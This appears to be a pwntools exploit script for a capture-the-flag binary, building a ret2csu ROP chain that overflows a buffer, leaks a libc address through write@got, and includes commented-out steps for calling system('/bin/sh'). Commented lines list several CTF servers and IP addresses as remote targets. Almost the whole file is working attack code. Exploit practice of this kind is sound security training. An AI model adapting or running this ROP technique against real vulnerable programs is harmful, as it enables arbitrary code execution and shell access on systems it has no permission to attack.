import time
from pwn import *
from LibcSearcher import *
from ctypes import *

# from struct import pack
# from ae64 import AE64

# io = remote("192.168.170.128", 9998)
# context.arch = "amd64"

# io = remote("chall.pwnable.tw", 10100)
# io = remote("61.147.171.105",   51565)
# io = remote("node4.buuoj.cn", 29323)
# io = remote("node5.anna.nssctf.cn", 28604)
# io = remote("112.6.51.212", 30969)
# io = remote("8.130.35.16", 51006)
io = process('./question_5_plus_x64')
gdb.attach(io)
# context(os='linux', arch = 'amd64', log_level = "debug")
elf = ELF('./question_5_plus_x64')
libc = ELF('./libc.so.6')


def s(a):
    io.send(a)


def sa(a, b):
    io.sendafter(a, b)


def sl(a):
    io.sendline(a)


def sal(a, b):
    io.sendlineafter(a, b)


def r():
    return (io.recv())


def ru(a):
    return io.recvuntil(a)


def rl():
    return io.recvline()


def sla(a, b):
    io.sendlineafter(a, b)


def debug():
    gdb.attach(io)
    pause()


def get_addr():
    return u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))


def inter():
    return io.interactive()


def print_addr(name, addr):
    print(f"{name} =", addr)


# context(os='linux', arch='amd64')
context(os='linux', arch='amd64', log_level="debug")

padding = 0x10
csu2 = 0x04011D8
csu1 = 0x04011EE
bss_addr = 0x0404038
write_got = elf.got["write"]
dofuction_addr = 0x0401132


def csu(fuct_got, a1, a2, a3, padding, ret_to_addr):
    payload = b'a' * padding
    payload += p64(csu1) + p64(0) + p64(0) + p64(1)  # p64(rsp+8 = 0) + p64(rbx) + p64(rbp)
    payload += p64(a3) + p64(a2) + p64(a1) + p64(fuct_got)
    payload += p64(csu2)
    payload += b'a' * (7 * 8)
    payload += p64(ret_to_addr)
    return payload



# print(hex(write_got))
# ru("input:")
# print("ok")
# sleep(1)
sla("input:", csu(write_got, 1, write_got, 8, padding, dofuction_addr))
# pause()
print("ok")
# ru("bye")
# print(rl())
# libc_base = u64(io.recv(8).ljust(0x8, b"\x00")) - write_got
# system_addr = libc_base - 0x04C330
# bin_sh = libc_base - 0x196031
# sla("input:", csu(read_got, 0, bss_addr, 16,padding,dofuction_addr)) #输入 /bin/sh 到bss段，当然也可以直接用libc中的/bin/sh
# sl('/bin/sh')
# sl(csu(system_addr, bss_addr, 0, padding, 0xdeadbeef))
inter()

